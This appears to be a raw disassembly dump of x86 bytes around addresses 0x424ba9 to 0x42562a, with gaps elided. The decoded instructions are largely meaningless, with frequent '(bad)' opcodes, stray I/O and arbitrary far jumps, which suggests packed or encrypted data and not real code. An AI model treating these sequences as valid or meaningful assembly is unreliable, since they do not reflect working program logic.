  424ba9:	mov    edi,0x80e90596
  424bae:	mov    bl,0xfe
  424bb0:	dec    edx
  424bb1:	(bad)  
  424bb3:	(bad)  
  424bb4:	div    esp
  424bb6:	lods   eax,DWORD PTR ds:[esi]
  424bb7:	or     al,0x6e
  424bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424bba:	lods   al,BYTE PTR ds:[esi]
  424bbb:	aas    
  424bbc:	stc    
  424bbd:	dec    esp
  424bbe:	int    0x22
  424bc0:	sub    eax,0x7acbabfb
  424bc5:	xor    BYTE PTR [ebp-0x63],bh
  424bc8:	push   ds
  424bc9:	mov    WORD PTR [edx+edi*8+0x3e],?
  424bcd:	jnp    0x424b8a
  424bcf:	fcmovbe st,st(1)
  424bd1:	mov    bh,0x59
  424bd3:	push   eax
  424bd4:	and    al,0xa9
  424bd6:	test   eax,0x48433538
  424bdb:	jns    0x424c4e
  424bdd:	pop    edx
  424bde:	mov    esi,0x3e3947e7
  424be3:	push   es
  424be4:	ins    BYTE PTR es:[edi],dx
  424be5:	(bad)  
  424be6:	mov    ecx,0xad8790bf
  424beb:	imul   ecx,DWORD PTR ds:0x4ee30cb3,0xdb79c8f9
  424bf5:	push   0x58
  424bf7:	xor    DWORD PTR ds:0xda409cc6,esp
  424bfd:	popa   
  424bfe:	les    edx,FWORD PTR [ebp+0x25981bb2]
  424c04:	mov    esi,0xde640513
  424c09:	enter  0x823,0x51
  424c0d:	(bad)  
  424c0f:	loop   0x424c41
  424c11:	shl    BYTE PTR [edx+0x53],1
  424c14:	jp     0x424c70
  424c16:	mov    cl,0x6b
  424c18:	add    eax,0x1c012942
  424c1d:	lock out dx,al
  424c1f:	push   eax
  424c20:	icebp  
  424c21:	inc    ecx
  424c22:	loope  0x424c9a
  424c24:	dec    esi
  424c25:	sbb    ch,ah
  424c27:	cmp    al,al
  424c29:	clc    
  424c2a:	dec    edi
  424c2b:	test   DWORD PTR [esi],eax
  424c2d:	scas   al,BYTE PTR es:[edi]
  424c2e:	pop    es
  424c2f:	cwde   
  424c30:	leave  
  424c31:	fucom  st(4)
  424c33:	push   ss
  424c34:	fsub   DWORD PTR [eax+0x157e0c06]
  424c3a:	(bad)  
  424c3c:	mov    esi,0x633815aa
  424c41:	and    eax,0x8e9b08cb
  424c46:	sahf   
  424c47:	jae    0x424c6a
  424c49:	sar    BYTE PTR [ebp+0x71],cl
  424c4c:	popa   
  424c4d:	test   ah,al
  424c4f:	push   0x813faca6
  424c54:	mov    eax,ds:0x9ba6e075
  424c59:	lahf   
  424c5a:	(bad)  
  424c5b:	aam    0x4b
  424c5d:	out    dx,eax
  424c5e:	push   esi
  424c5f:	cs in  eax,0x2d
  424c62:	lods   eax,DWORD PTR ds:[esi]
  424c63:	mov    bh,0xbb
  424c65:	dec    ecx
  424c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c67:	cmp    ah,BYTE PTR [edx+0x391baf93]
  424c6d:	aaa    
  424c6e:	and    eax,0x39f88f1f
  424c73:	push   ebx
  424c74:	mov    esp,0xa7558685
  424c79:	cld    
  424c7a:	shr    BYTE PTR [ecx+0x43],cl
  424c7d:	dec    edx
  424c7e:	inc    eax
  424c7f:	sbb    esp,DWORD PTR [eax-0x4c]
  424c82:	or     al,0x26
  424c84:	push   ebx
  424c85:	ret    0x1b9c
  424c88:	fldenv [edx+eax*2-0x260005af]
  424c8f:	pop    edx
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx+0x1cb251a8]
  424d02:	or     DWORD PTR [ebp-0x54],ecx
  424d05:	mov    BYTE PTR [ecx],al
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	ret    
  424d0d:	cdq    
  424d0e:	je     0x424c93
  424d10:	cmp    ah,0x11
  424d13:	loop   0x424d17
  424d15:	inc    ecx
  424d16:	add    DWORD PTR [eax-0xce0dd9],0x25a14880
  424d20:	xor    al,0xd1
  424d22:	inc    edi
  424d23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d24:	les    ebx,FWORD PTR [esi+0x2360858d]
  424d2a:	call   eax
  424d2c:	std    
  424d2d:	dec    edi
  424d2e:	daa    
  424d2f:	sub    eax,0x6daaeb54
  424d34:	mov    esp,0x8b70d99e
  424d39:	test   eax,0xc979812d
  424d3e:	mov    ah,0x7d
  424d40:	loope  0x424cc2
  424d42:	imul   esp,DWORD PTR [edx+esi*4+0x79],0x5cb944e1
  424d4a:	in     al,0xd1
  424d4c:	sub    BYTE PTR [esi],0xaa
  424d4f:	mov    edi,0xf9b65e5f
  424d54:	ins    DWORD PTR es:[edi],dx
  424d55:	mov    ds:0xb0ee536,eax
  424d5a:	in     al,0x71
  424d5c:	jb     0x424dcb
  424d5e:	or     esi,esp
  424d60:	loope  0x424db5
  424d62:	and    eax,0xa7a27662
  424d67:	xchg   DWORD PTR [esi+0x20],edi
  424d6a:	xchg   esi,eax
  424d6b:	jne    0x424dc5
  424d6d:	jmp    0x750188bc
  424d72:	popa   
  424d73:	mov    ebx,0x7e708072
  424d78:	add    eax,0xa20123fd
  424d7d:	inc    edi
  424d7e:	lods   eax,DWORD PTR ds:[esi]
  424d7f:	jno    0x424d41
  424d81:	je     0x424e00
  424d83:	mov    ds:0x1278d7dc,eax
  424d88:	aad    0x11
  424d8a:	ins    DWORD PTR es:[edi],dx
  424d8b:	lahf   
  424d8c:	mov    ah,0x81
  424d8e:	sub    eax,DWORD PTR [eax+0x47f66919]
  424d94:	mov    ebp,0x1571f53
  424d99:	div    DWORD PTR [edx+0x7b]
  424d9c:	add    dl,BYTE PTR [edx]
  424d9e:	mov    esi,0x146fc040
  424da3:	loope  0x424d57
  424da5:	aad    0x4b
  424da7:	sbb    al,0x3c
  424da9:	jg     0x424d5f
  424dab:	rol    edx,cl
  424dad:	pop    edi
  424dae:	dec    eax
  424daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424db0:	sub    ebx,DWORD PTR [ebx+ebp*4-0x3a]
  424db4:	sti    
  424db5:	xchg   DWORD PTR [esi+0x171bd5c3],esp
  424dbb:	or     BYTE PTR [ebx],0xdf
  424dbe:	adc    al,0x2f
  424dc0:	xchg   edx,eax
  424dc1:	stos   DWORD PTR es:[edi],eax
  424dc2:	dec    esp
  424dc3:	dec    edx
  424dc4:	sbb    eax,edx
  424dc6:	sub    BYTE PTR [edx+0x5475326d],bh
  424dcc:	adc    eax,ebx
  424dce:	push   esp
  424dcf:	aaa    
  424dd0:	test   BYTE PTR [eax+0x5a],ch
  424dd3:	cld    
  424dd4:	jecxz  0x424e03
  424dd6:	pop    eax
  424dd7:	mov    esp,0xaeb41b82
  424ddc:	(bad)  
  424dde:	nop
  424ddf:	sub    BYTE PTR [esi],cl
  424de1:	mov    ah,0x9a
  424de3:	hlt    
  424de4:	mov    al,ds:0x39f2000e
  424de9:	fsubr  QWORD PTR [edi-0x6fb35ce4]
  424def:	aad    0x41
  424df1:	addr16 jp 0x424d81
  424df4:	loope  0x424d7f
  424df6:	rcr    BYTE PTR [ebx-0x5be503c0],0x81
  424dfd:	dec    esp
  424dfe:	jno    0x424de9
  424e00:	sbb    ebx,DWORD PTR [eax+0x1fc09d25]
  424e06:	pop    ebx
  424e07:	call   0xc81bd69
  424e0c:	(bad)  
  424e0d:	popa   
  424e0e:	xor    bh,dh
	...
  424e74:	cmp    eax,0xf361d20c
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e66
  424e81:	xor    DWORD PTR [edx],ecx
  424e83:	into   
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	out    dx,al
  424e8d:	xor    eax,0xf9c4ed6e
  424e92:	mov    bh,0xbf
  424e94:	shl    edx,0x6
  424e97:	and    eax,eax
  424e99:	inc    esp
  424e9a:	and    dh,bl
  424e9c:	out    dx,al
  424e9d:	sub    edx,edi
  424e9f:	jnp    0x424ecb
  424ea1:	cmc    
  424ea2:	mov    cl,0x58
  424ea4:	mov    ds:0x6c16af63,eax
  424ea9:	stos   BYTE PTR es:[edi],al
  424eaa:	je     0x424eb1
  424eac:	femms  
  424eae:	jecxz  0x424ee9
  424eb0:	mov    esi,0x8c769740
  424eb5:	add    dh,BYTE PTR [eax-0x1c]
  424eb8:	pop    ebx
  424eb9:	pop    edx
  424eba:	inc    ecx
  424ebb:	push   cs
  424ebc:	test   DWORD PTR [ebp-0x5c],0x7033eef1
  424ec3:	in     eax,dx
  424ec4:	mov    ds:0xaecbd596,al
  424ec9:	scas   eax,DWORD PTR es:[edi]
  424eca:	pop    es
  424ecb:	inc    ecx
  424ecc:	xchg   edx,eax
  424ecd:	jmp    0x5f10:0xb7e52769
  424ed4:	cmp    al,0xc3
  424ed6:	mov    ebp,0xd3df08c
  424edb:	shl    DWORD PTR [edi-0x34],1
  424ede:	xchg   ecx,eax
  424edf:	dec    ebx
  424ee0:	sbb    al,0x3c
  424ee2:	rcr    BYTE PTR [ecx-0x47],1
  424ee5:	(bad)  
  424ee6:	and    esi,DWORD PTR es:[edx+ebp*8-0x8cd82c0]
  424eee:	into   
  424eef:	dec    esp
  424ef0:	stc    
  424ef1:	(bad)  
  424ef3:	fcomp  DWORD PTR [eax+0x76]
  424ef6:	ss loop 0x424ee5
  424ef9:	xchg   BYTE PTR [ebp+eiz*8+0x12],bl
  424efd:	add    cl,BYTE PTR [ecx]
  424eff:	lods   al,BYTE PTR ds:[esi]
  424f00:	mul    ebp
  424f02:	adc    ch,BYTE PTR [ecx-0x263e22f3]
  424f08:	(bad)  
  424f09:	push   ds
  424f0a:	aas    
  424f0b:	add    BYTE PTR [ecx],ah
  424f0d:	cs xchg ebp,eax
  424f0f:	int3   
  424f10:	mov    edi,0xe45c0b2c
  424f15:	pusha  
  424f16:	out    0xd0,al
  424f18:	cld    
  424f19:	push   ss
  424f1a:	sbb    dh,ch
  424f1c:	push   0x9abe0fc6
  424f21:	mov    ebp,0xca2da5ab
  424f26:	pop    edx
  424f27:	jns    0x424f09
  424f29:	imul   DWORD PTR [ebx-0x78]
  424f2c:	or     DWORD PTR [edi-0x1b16daec],ebp
  424f32:	mov    bh,0x53
  424f34:	iret   
  424f35:	rcl    al,0x5a
  424f38:	out    0xe4,eax
  424f3a:	xchg   ebp,eax
  424f3b:	push   0xa11df467
  424f40:	ss dec eax
  424f42:	cld    
  424f43:	pop    edi
  424f44:	cld    
  424f45:	retf   0xb410
  424f48:	adc    ebx,0x80e28b78
  424f4e:	das    
  424f4f:	cmp    esi,DWORD PTR [edx+0x45]
  424f52:	outs   dx,DWORD PTR ds:[esi]
  424f53:	xor    esi,DWORD PTR [edi-0x66f6ca1b]
  424f59:	ret    0xc274
  424f5c:	sub    eax,0x9634b6f5
  424f61:	push   cs
  424f62:	xchg   esp,eax
  424f63:	xchg   edi,eax
  424f64:	int    0xb9
  424f66:	mov    al,ds:0x9f2b0f24
  424f6b:	ror    DWORD PTR [eax+0x5eec77e5],1
  424f71:	dec    esp
  424f72:	stos   BYTE PTR es:[edi],al
  424f73:	xchg   ebp,eax
  424f74:	frstor [esi+0x33]
  424f77:	sbb    BYTE PTR [esi-0x59],al
  424f7a:	fcomp  QWORD PTR [ecx-0x57]
  424f7d:	jle    0x424f5b
  424f7f:	sub    eax,0x2248d271
  424f84:	xlat   BYTE PTR ds:[ebx]
  424f85:	mov    BYTE PTR ds:0x3f10a754,al
  424f8b:	scas   al,BYTE PTR es:[edi]
  424f8c:	mov    al,0xbf
  424f8e:	inc    esi
  424f8f:	pop    edx
	...
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	enter  0x115e,0xf9
  425004:	mov    ah,0x8a
  425006:	add    DWORD PTR [eax],eax
  425008:	add    al,0x1
  42500a:	add    BYTE PTR [eax],al
  42500c:	fnstcw WORD PTR [ebp+0x43]
  42500f:	cld    
  425010:	or     BYTE PTR [esi],ch
  425012:	mov    DWORD PTR [edi-0x440423a2],edi
  425018:	cmp    al,0x64
  42501a:	and    esp,DWORD PTR [ecx+0x2cdcdfd0]
  425020:	xor    BYTE PTR [edi+0x103dd540],dl
  425026:	rcr    BYTE PTR [esp+ebp*2-0x2b6e1d04],0x87
  42502e:	push   esp
  42502f:	xor    edx,DWORD PTR [ecx]
  425031:	scas   eax,DWORD PTR es:[edi]
  425032:	push   ecx
  425033:	cmp    cl,ah
  425035:	xchg   ecx,eax
  425036:	xchg   esi,eax
  425037:	call   0x89e1f639
  42503c:	inc    ecx
  42503d:	ss inc edx
  42503f:	and    esi,eax
  425041:	xchg   esp,eax
  425042:	rcl    DWORD PTR [esi],0x91
  425045:	cmp    cl,BYTE PTR [edi+0xa95d4c3]
  42504b:	sbb    BYTE PTR [edi],0x45
  42504e:	ins    BYTE PTR es:[edi],dx
  42504f:	pop    es
  425050:	loope  0x425079
  425052:	xor    al,0x16
  425054:	sbb    al,BYTE PTR [eax-0x2f2cd450]
  42505a:	pop    edi
  42505b:	inc    ebp
  42505c:	and    eax,0xb783800d
  425061:	dec    ebp
  425062:	lods   eax,DWORD PTR ds:[esi]
  425063:	stc    
  425064:	lahf   
  425065:	mov    ah,0xb8
  425067:	popa   
  425068:	xchg   ebx,eax
  425069:	and    eax,0x7971e3cd
  42506e:	mov    esp,0x470a2264
  425073:	popf   
  425074:	pop    esi
  425075:	das    
  425076:	in     al,dx
  425077:	test   BYTE PTR [ebp+0x61],dh
  42507a:	jbe    0x425001
  42507c:	push   ebx
  42507d:	mov    WORD PTR [eax+ebp*8],cs
  425080:	and    ebx,edi
  425082:	jnp    0x4250c8
  425084:	cmp    al,0x95
  425086:	icebp  
  425087:	jg     0x4250cf
  425089:	int    0x17
  42508b:	leave  
  42508c:	pop    edx
  42508d:	std    
  42508e:	and    edx,ecx
  425090:	mov    ch,0x8b
  425092:	pop    ecx
  425093:	xor    esp,ebp
  425095:	mov    cl,0xa9
  425097:	in     al,0xd6
  425099:	dec    ecx
  42509a:	adc    al,0xf8
  42509c:	xchg   DWORD PTR [esi+0x764dfd6e],ebx
  4250a2:	int    0x27
  4250a4:	sub    ch,BYTE PTR [eax+0x46]
  4250a7:	add    eax,0xf92cd052
  4250ac:	cli    
  4250ad:	jmp    0xe2bc1f3
  4250b2:	icebp  
  4250b3:	lods   eax,DWORD PTR ds:[esi]
  4250b4:	lods   eax,DWORD PTR ds:[esi]
  4250b5:	or     BYTE PTR [ecx+0x1e],ah
  4250b8:	push   ds
  4250b9:	shl    esi,1
  4250bb:	out    0x8,eax
  4250bd:	jno    0x425113
  4250bf:	mov    BYTE PTR [esi+0x16],cl
  4250c2:	jp     0x4250fa
  4250c4:	mov    dl,0x78
  4250c6:	xchg   ebx,eax
  4250c8:	bound  edi,QWORD PTR [edi]
  4250ca:	sahf   
  4250cb:	push   cs
  4250cc:	and    eax,DWORD PTR [ecx+0x2dad4c32]
  4250d2:	je     0x4250ba
  4250d4:	mov    cl,BYTE PTR [eax-0x57]
  4250d7:	ins    DWORD PTR es:[edi],dx
  4250d8:	push   0xffffffac
  4250da:	cwde   
  4250db:	jnp    0x42509c
  4250dd:	nop
  4250de:	xor    eax,DWORD PTR [esi]
  4250e0:	dec    edi
  4250e1:	loopne 0x42510e
  4250e3:	push   edx
  4250e4:	dec    ecx
  4250e5:	jge    0x42510e
  4250e7:	sbb    dl,BYTE PTR [esp+ebx*2]
  4250ea:	mov    esi,0xa0df2ba5
  4250ef:	outs   dx,DWORD PTR ds:[esi]
  4250f0:	xor    BYTE PTR [ebx+0x3d],al
  4250f3:	mov    edx,0x422185c5
  4250f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250f9:	sub    DWORD PTR [edi],ebx
  4250fb:	loop   0x4250e4
  4250fd:	push   edx
  4250fe:	inc    ecx
  4250ff:	loopne 0x4250e0
  425101:	cdq    
  425102:	arpl   WORD PTR [ebx+0x50f45e17],cx
  425108:	jmp    0xfc3b:0xffa4b4a6
  42510f:	adc    al,0x0
	...
  425171:	add    BYTE PTR [eax],al
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x4946:0xab9592e8
  425184:	mov    eax,0x400018b
  425189:	add    DWORD PTR [eax],eax
  42518b:	add    BYTE PTR [edx],bl
  42518d:	test   edi,edx
  42518f:	push   ds
  425190:	mov    bl,0x65
  425192:	cli    
  425193:	push   ecx
  425194:	jo     0x425121
  425196:	sbb    bh,bh
  425198:	cld    
  425199:	jmp    0x783f:0xc0f797c4
  4251a0:	aaa    
  4251a1:	xor    DWORD PTR [ecx+0x6eda3d1c],0x1b50df62
  4251ab:	adc    dh,bl
  4251ad:	mov    bh,0x5e
  4251af:	popa   
  4251b0:	popf   
  4251b1:	ror    BYTE PTR [eax+0x3abbd169],cl
  4251b7:	pop    ss
  4251b8:	repnz add edx,DWORD PTR [ebp+0x7]
  4251bc:	push   ecx
  4251bd:	cwde   
  4251be:	aad    0xeb
  4251c0:	add    BYTE PTR [esp+ecx*1+0x240c5795],ch
  4251c7:	(bad)  
  4251c9:	loope  0x42520e
  4251cb:	or     BYTE PTR fs:[ebx-0x7528e0e8],ah
  4251d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4251d3:	add    DWORD PTR ds:0xb1af2561,eax
  4251d9:	int    0x7a
  4251db:	loope  0x4251b4
  4251dd:	or     al,0xdf
  4251df:	xchg   ebp,eax
  4251e0:	add    ah,dh
  4251e2:	shl    DWORD PTR [ebx],0xd5
  4251e5:	std    
  4251e6:	pushf  
  4251e7:	gs push edi
  4251e9:	sub    al,0xe8
  4251eb:	ins    BYTE PTR es:[edi],dx
  4251ec:	push   ebp
  4251ed:	mov    edx,0x795f5872
  4251f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251f3:	cli    
  4251f4:	sbb    edx,0x10f264d9
  4251fa:	mov    al,ds:0x934d146e
  4251ff:	or     al,0x6
  425201:	or     bh,BYTE PTR [edi+0x4e]
  425204:	sub    DWORD PTR [esi-0x11],esp
  425207:	inc    esi
  425208:	sahf   
  425209:	das    
  42520a:	aad    0x5
  42520c:	and    al,0x1
  42520e:	mov    bl,0x8f
  425210:	jns    0x4251c3
  425212:	hlt    
  425213:	inc    DWORD PTR [eax+0x40]
  425216:	xor    al,0xf9
  425218:	(bad)  
  425219:	mov    ds:0x83391274,al
  42521e:	sbb    al,0x98
  425220:	mov    BYTE PTR [edi-0xbc00d9],al
  425226:	test   al,0x36
  425228:	push   0xb535a362
  42522d:	aaa    
  42522e:	popf   
  42522f:	dec    eax
  425230:	mov    cl,0x8b
  425232:	sub    eax,0xb498040d
  425237:	inc    ebx
  425238:	retf   0xbbf1
  42523b:	imul   edx,esp,0xffffffc9
  42523e:	adc    al,0xce
  425240:	or     dh,BYTE PTR [eax]
  425242:	mov    esi,DWORD PTR [ebp+0x50261f84]
  425248:	(bad)  
  425249:	sbb    DWORD PTR [ebp-0x47c6ab6b],0xffffffa1
  425250:	ins    DWORD PTR es:[edi],dx
  425251:	xlat   BYTE PTR ds:[ebx]
  425252:	out    0x3,al
  425254:	push   edi
  425255:	fbld   TBYTE PTR [edx]
  425257:	fs xor ebx,esi
  42525a:	mov    eax,ds:0x292b488a
  42525f:	cmp    DWORD PTR [ecx-0x29],ecx
  425262:	adc    DWORD PTR [ecx],eax
  425264:	pop    ebp
  425265:	sub    bh,BYTE PTR [ecx+0x3d]
  425268:	sbb    al,BYTE PTR [ebp-0x1206e4f0]
  42526e:	nop
  42526f:	jne    0x42521b
  425271:	add    DWORD PTR [esi+ecx*4+0x7d7f3028],esp
  425278:	mov    WORD PTR [esp+ecx*1],cs
  42527b:	xor    eax,0xff88bb89
  425280:	(bad)  
  425282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425283:	fisubr DWORD PTR [ecx]
  425285:	push   ebx
  425286:	mov    ch,0xc
  425288:	mov    dh,0xc9
  42528a:	dec    edx
  42528b:	in     eax,0xf3
  42528d:	sbb    dh,BYTE PTR [eax+0x5b]
	...
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	or     ecx,edi
  425302:	xor    esi,eax
  425304:	mov    esp,0x400018c
  425309:	add    DWORD PTR [eax],eax
  42530b:	add    BYTE PTR [esi+0x26f0e3e9],dh
  425311:	xchg   DWORD PTR [edx+0x17],ebx
  425314:	and    ecx,0xb8f86dcd
  42531a:	arpl   bx,si
  42531c:	mov    edx,0x61c19f52
  425321:	pop    edi
  425322:	cwde   
  425323:	(bad)  
  425324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425325:	pop    ebx
  425326:	aaa    
  425327:	fmulp  st(3),st
  425329:	test   DWORD PTR [esi],ebx
  42532b:	mov    eax,ds:0xce0c92e7
  425330:	rol    BYTE PTR [ecx],cl
  425332:	pop    edi
  425333:	ret    0xd22f
  425336:	cmp    cl,dl
  425338:	jae    0x42536c
  42533a:	frstor ds:0x93b7738
  425340:	dec    edx
  425341:	arpl   cx,si
  425343:	dec    edx
  425344:	int    0x2a
  425346:	inc    ecx
  425347:	rcl    BYTE PTR [ebp-0x72],cl
  42534a:	(bad)  
  42534b:	in     al,0xaf
  42534d:	jmp    0xcd41:0x169ae59
  425354:	or     DWORD PTR [ebp-0x3f],ecx
  425357:	clc    
  425358:	push   ecx
  425359:	push   edx
  42535a:	jle    0x425321
  42535c:	ret    
  42535d:	into   
  42535e:	sar    DWORD PTR [edx+0x65],cl
  425361:	cwde   
  425362:	add    al,0xa1
  425364:	mov    dl,0xb9
  425366:	and    dl,BYTE PTR [edx-0x28]
  425369:	jbe    0x425333
  42536b:	fsubr  DWORD PTR [esi]
  42536d:	mov    BYTE PTR [ebp+0x43],al
  425370:	push   edx
  425371:	mov    ebp,0xb5573b5d
  425376:	dec    esp
  425377:	pop    ecx
  425378:	sbb    al,0x91
  42537a:	sub    ebx,DWORD PTR [edx-0x10]
  42537d:	push   esi
  42537e:	dec    esi
  42537f:	arpl   bx,dx
  425381:	sti    
  425382:	mov    ebx,0xcbf19b8d
  425387:	xchg   esp,eax
  425388:	jnp    0x42537b
  42538a:	adc    BYTE PTR [edi+0x7f],ah
  42538d:	fisttp WORD PTR [ebx-0x34]
  425390:	mov    eax,0x4267f3f9
  425395:	or     al,0x1f
  425397:	xchg   edi,eax
  425398:	rol    BYTE PTR [edx-0x63ed4b48],cl
  42539e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42539f:	int3   
  4253a0:	add    esp,esp
  4253a2:	or     DWORD PTR [eax],0x14
  4253a5:	mul    cl
  4253a7:	ja     0x4253a8
  4253a9:	jo     0x4253cc
  4253ab:	in     al,0x3c
  4253ad:	mov    BYTE PTR [ebp-0x1d3ef8e8],0xb6
  4253b4:	loopne 0x42540d
  4253b6:	mov    ch,dl
  4253b8:	xor    al,0xd7
  4253ba:	jbe    0x42539e
  4253bc:	inc    edx
  4253bd:	inc    eax
  4253be:	iret   
  4253bf:	xchg   ebp,eax
  4253c0:	adc    dh,bh
  4253c2:	ret    
  4253c3:	pop    ecx
  4253c4:	mov    eax,ds:0x73bb13b8
  4253c9:	inc    BYTE PTR [eax+0x28]
  4253cc:	clc    
  4253cd:	pop    ds
  4253ce:	out    dx,al
  4253cf:	(bad)  
  4253d0:	jl     0x425366
  4253d2:	jne    0x4253fb
  4253d4:	cmc    
  4253d5:	mov    edx,0x4e972bbc
  4253da:	sub    cl,al
  4253dc:	xchg   edi,eax
  4253dd:	out    dx,al
  4253de:	shr    DWORD PTR [edi+0x2ac9aac5],1
  4253e4:	lods   eax,DWORD PTR ds:[esi]
  4253e5:	imul   esi,DWORD PTR [ebp+0x39369d24],0x55ab5ba9
  4253ef:	xchg   ecx,eax
  4253f0:	call   DWORD PTR [edi+ecx*2-0x2ebbdc39]
  4253f7:	call   esp
  4253f9:	rcr    ch,0x7e
  4253fc:	aam    0xdb
  4253fe:	aaa    
  4253ff:	or     BYTE PTR ds:0x56fa2af3,bl
  425405:	or     DWORD PTR [ecx+0xa],0xc0936bed
  42540c:	rcr    BYTE PTR [ebp+ebp*8-0x76],0x0
	...
  425471:	add    BYTE PTR [eax],al
  425473:	add    BYTE PTR [edx+0x9],al
  425476:	les    ebp,FWORD PTR [ecx-0x14901231]
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebp,ecx
  425481:	retf   
  425482:	retf   
  425483:	dec    ebp
  425484:	ror    BYTE PTR [ebp+0x1040001],0x0
  42548b:	add    BYTE PTR [esi-0x78],cl
  42548e:	push   0x6bda6a5d
  425493:	std    
  425494:	push   eax
  425495:	inc    ecx
  425496:	mov    esp,0x631d4861
  42549b:	je     0x425485
  42549d:	jle    0x425432
  42549f:	xlat   BYTE PTR ds:[ebx]
  4254a0:	pop    ebp
  4254a1:	mov    bh,0xb7
  4254a3:	rep outs dx,DWORD PTR ds:[esi]
  4254a5:	mov    DWORD PTR [esi],eax
  4254a7:	jmp    0x425451
  4254a9:	mov    DWORD PTR [ebx+0xd],edi
  4254ac:	fst    QWORD PTR [esi-0xfb433d]
  4254b2:	in     al,dx
  4254b3:	inc    eax
  4254b4:	pushf  
  4254b5:	dec    edx
  4254b6:	into   
  4254b7:	adc    BYTE PTR gs:[esi+0x4e64b4dd],ch
  4254be:	add    eax,0xbc74ee5a
  4254c3:	fidivr DWORD PTR [ecx]
  4254c5:	jo     0x425460
  4254c7:	sbb    BYTE PTR [eax],bh
  4254c9:	mov    esp,0x8b088251
  4254ce:	dec    edx
  4254cf:	fisttp WORD PTR [edx+0x6965dbbe]
  4254d5:	cmp    DWORD PTR [edi+0x78ce5530],edi
  4254db:	push   0x14
  4254dd:	mov    dh,0x11
  4254df:	push   eax
  4254e0:	stos   DWORD PTR es:[edi],eax
  4254e1:	or     eax,0xcd4a268e
  4254e6:	add    ecx,ebp
  4254e8:	mov    eax,0x85d6c4af
  4254ed:	xchg   ecx,eax
  4254ee:	int3   
  4254ef:	cmp    BYTE PTR [ebx-0x70],dl
  4254f2:	mov    eax,0x6a3c37ff
  4254f7:	cs jb  0x4254d7
  4254fa:	cmc    
  4254fb:	ja     0x42552c
  4254fd:	dec    eax
  4254fe:	jmp    0x4254b8
  425500:	or     edi,DWORD PTR [ecx+edi*1-0x21]
  425504:	xor    ebp,DWORD PTR [edx+0x5a5beb8]
  42550a:	xor    eax,0x3ab6c88f
  42550f:	retf   
  425510:	inc    ecx
  425511:	xchg   DWORD PTR fs:[eax+esi*8-0x70f7e9e5],edi
  425519:	dec    ebx
  42551a:	out    0x67,al
  42551c:	call   0xb532:0xd48319ac
  425523:	aad    0x8e
  425525:	xor    bh,dl
  425527:	cmp    ecx,DWORD PTR [eax-0x1f]
  42552a:	(bad)  
  42552b:	neg    DWORD PTR [ecx+eax*1+0x7b]
  42552f:	iret   
  425530:	mov    ah,0xd9
  425532:	cmp    al,0x9a
  425534:	in     eax,0xa0
  425536:	or     DWORD PTR [ebp+0x62],0x7e1c071d
  42553d:	xchg   ecx,eax
  42553e:	rcl    BYTE PTR [edi-0x62],0x3c
  425542:	fisubr DWORD PTR [esi]
  425544:	cld    
  425545:	add    al,0x7a
  425547:	inc    ebx
  425548:	out    0x83,al
  42554a:	jnp    0x4254e0
  42554c:	pop    ebp
  42554d:	add    BYTE PTR [ecx+0x5e],bl
  425550:	or     al,0xff
  425552:	dec    ebp
  425553:	outs   dx,BYTE PTR ds:[esi]
  425554:	aas    
  425555:	jge    0x425560
  425557:	fwait
  425558:	les    esi,FWORD PTR [ebx]
  42555a:	(bad)  
  42555b:	daa    
  42555c:	xor    bl,BYTE PTR [esi]
  42555e:	in     eax,dx
  42555f:	cmp    ebx,eax
  425561:	adc    eax,0x1821b46b
  425566:	mov    eax,ds:0xe6e90f41
  42556b:	into   
  42556c:	stos   DWORD PTR es:[edi],eax
  42556d:	aam    0xac
  42556f:	test   DWORD PTR [edi],0xb7557928
  425575:	cmp    eax,0xa8895cd6
  42557a:	mov    ch,0x30
  42557c:	call   0xc44b:0xc6025e38
  425583:	adc    al,0x1f
  425585:	ror    BYTE PTR [edx+0x2b],1
  425588:	xlat   BYTE PTR ds:[ebx]
  425589:	test   BYTE PTR [eax-0x2cc69a7b],dh
  42558f:	bound  eax,QWORD PTR [eax]
	...
  4255f1:	add    BYTE PTR [eax],al
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x54eef13a
  425602:	ret    0xc4a4
  425605:	mov    es,WORD PTR [ecx]
  425607:	add    BYTE PTR [ecx+eax*1],al
  42560a:	add    BYTE PTR [eax],al
  42560c:	lahf   
  42560d:	data16 cld 
  42560f:	fsub   st(1),st
  425611:	cdq    
  425612:	ins    BYTE PTR es:[edi],dx
  425613:	pop    esi
  425614:	jbe    0x4255f6
  425616:	stos   BYTE PTR es:[edi],al
  425617:	(bad)  
  425619:	inc    esp
  42561a:	jmp    0x6ff2:0x77ec6a47
  425621:	nop
  425622:	inc    edx
  425623:	ins    BYTE PTR es:[edi],dx
  425624:	sub    ebp,ebp
  425626:	fs inc ebx
  425628:	fcmovnbe st,st(2)
  42562a:	cdq    
